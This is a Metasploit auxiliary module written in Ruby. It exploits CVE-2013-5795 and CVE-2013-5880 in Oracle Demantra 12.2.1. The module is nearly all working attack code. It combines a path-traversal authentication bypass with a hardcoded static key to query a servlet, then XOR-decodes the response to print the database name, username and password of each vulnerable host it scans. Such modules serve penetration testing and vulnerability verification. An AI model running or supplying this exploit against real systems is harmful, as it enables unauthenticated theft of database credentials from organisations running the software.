##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Demantra Database Credentials Leak',
      'Description'    => %q{
       This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in combination with an authentication bypass.
       This way an unauthenticated user can retreive the database name, username and password on any vulnerable machine.
      },
      'References'     =>
        [
          [ 'CVE', '2013-5795'],
          [ 'CVE', '2013-5880'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5795/'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]
        ],
      'Author'         =>
        [
          'Oliver Gruskovnjak'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "February 28 2014"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('SSL',   [false, 'Use SSL', false])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    authbypass = "/demantra/common/loginCheck.jsp/../../"
    staticUAK = "ServerDetailsServlet?UAK=406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1"
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("#{authbypass}", "#{staticUAK}")
    })


    if res.nil? or res.body.empty?
      fail_with("No content retrieved from: #{ip}")
    end

    if res.code == 404
      print_error("#{rhost}:#{rport} - File not found")
      return
    end

    if res.code == 200
      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")

      creds = ""
      print_status("String received: #{res.body.to_s}")
      res.body.to_s.split(",").each do|c|
        i = c.to_i ^ 0x50
        creds += i.chr
      end
      print_good("Credentials decoded: #{creds}")
    end
  end
end
